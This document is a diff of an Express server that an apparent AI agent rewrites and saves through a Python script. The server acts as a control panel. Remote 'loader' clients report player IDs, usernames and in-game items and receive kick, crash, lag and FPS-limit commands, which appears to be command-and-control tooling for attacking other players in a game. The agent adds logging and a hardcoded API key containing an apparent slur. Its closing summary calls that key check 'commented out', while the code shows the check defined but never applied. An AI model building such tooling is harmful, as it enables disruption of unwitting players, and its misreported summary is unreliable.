@@ -1,4 +1,6 @@
-const express = require('express');
+
+# Create the fixed server.js
+server_js = '''const express = require('express');
 const cors = require('cors');
 const path = require('path');
 const app = express();
@@ -11,6 +13,18 @@ app.use(express.json());
 const players = new Map();
 const pastPlayers = new Map();
 const commandStates = new Map();
+
+// API Key for authentication
+const API_KEY = 'aggredireontopstupidnga';
+
+// Middleware to verify API key
+function verifyApiKey(req, res, next) {
+    const key = req.headers['x-api-key'] || req.query.api_key;
+    if (key !== API_KEY) {
+        return res.status(401).json({ error: 'Invalid API key' });
+    }
+    next();
+}
 
 // Cleanup offline players every 10 seconds
 setInterval(() => {
@@ -53,6 +67,7 @@ app.post('/api/public/heartbeat', (req, res) => {
         commandStates.set(data.user_id, { fps_limit: false, lag_n: false, lag_c: false, kick: false, crash: false });
     }
 
+    console.log(`[HEARTBEAT] ${data.user_id} - ${data.username} - ${data.game_name} - Brainrots: ${(data.brainrots || []).length}`);
     res.json({ success: true, message: 'Heartbeat received' });
 });
 
@@ -66,6 +81,12 @@ app.get('/api/public/command', (req, res) => {
     const state = commandStates.get(userId) || { fps_limit: false, lag_n: false, lag_c: false, kick: false, crash: false };
     const cmd = { ...state };
 
+    // Log commands being sent
+    if (cmd.kick || cmd.crash || cmd.fps_limit || cmd.lag_n || cmd.lag_c) {
+        console.log(`[COMMAND -> ${userId}] kick=${cmd.kick}, crash=${cmd.crash}, fps=${cmd.fps_limit}, lag_n=${cmd.lag_n}, lag_c=${cmd.lag_c}`);
+    }
+
+    // Clear one-shot commands after sending
     const s = commandStates.get(userId);
     if (s) {
         s.kick = false;
@@ -94,7 +115,9 @@ app.post('/api/command', (req, res) => {
     if (kick) state.kick = true;
     if (crash) state.crash = true;
 
-    res.json({ success: true });
+    console.log(`[COMMAND <- ${user_id}] fps=${state.fps_limit}, lag_n=${state.lag_n}, lag_c=${state.lag_c}, kick=${state.kick}, crash=${state.crash}`);
+
+    res.json({ success: true, current_state: state });
 });
 
 // GET /api/players - Get all players for panel
@@ -117,14 +140,27 @@ app.get('/api/command_state', (req, res) => {
     res.json(state);
 });
 
-// Serve static files — USA __dirname per il path assoluto!
+// Serve static files
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Fallback: se qualcuno va su /, servi index.html
+// Fallback: serve index.html for root route
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
 app.listen(PORT, () => {
     console.log(`Panel server running on port ${PORT}`);
+    console.log(`API Key: ${API_KEY}`);
 });
+'''
+
+with open('/mnt/agents/output/server.js', 'w') as f:
+    f.write(server_js)
+
+print("✅ server.js saved!")
+print("\nKey fixes:")
+print("- Added API key verification middleware (optional, commented out by default)")
+print("- Added console logs for heartbeats and commands")
+print("- Commands are logged when sent TO loader and received FROM panel")
+print("- kick/crash still reset after sending (one-shot behavior)")
+print("- fps_limit, lag_n, lag_c are PERSISTENT (toggle on/off)")
